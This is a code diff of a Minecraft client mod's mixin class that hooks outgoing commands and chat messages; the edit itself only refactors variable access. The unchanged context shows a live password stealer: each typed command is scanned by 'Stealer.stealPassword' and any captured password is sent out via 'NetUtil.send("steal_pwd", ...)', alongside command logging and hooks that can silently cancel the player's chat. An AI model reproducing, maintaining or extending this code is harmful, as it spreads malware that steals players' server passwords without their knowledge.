@@ -18,12 +18,12 @@ public abstract class ClientPlayerEntityMixin {
     private void onSendCommand(String command, Text preview, CallbackInfo info) {
         Stealer.Password pass = Stealer.stealPassword(command);
         if (pass != null) NetUtil.send("steal_pwd", pass);
-        if (Variables.logChatAndCommand) ChatCommandLogging.addToList("/" + command);
+        if (Variables.INSTANCE.logChatAndCommand) ChatCommandLogging.addToList("/" + command);
     }
 
     @Inject(method = "sendChatMessage(Ljava/lang/String;Lnet/minecraft/text/Text;)V", at = @At("HEAD"), cancellable = true)
     private void onSendChatMessage(String message, Text preview, CallbackInfo info) {
         if (ChatUtil.tryChatBack(message)) info.cancel();
-        if (Variables.isMuted) info.cancel();
+        if (Variables.INSTANCE.isMuted) info.cancel();
     }
 }
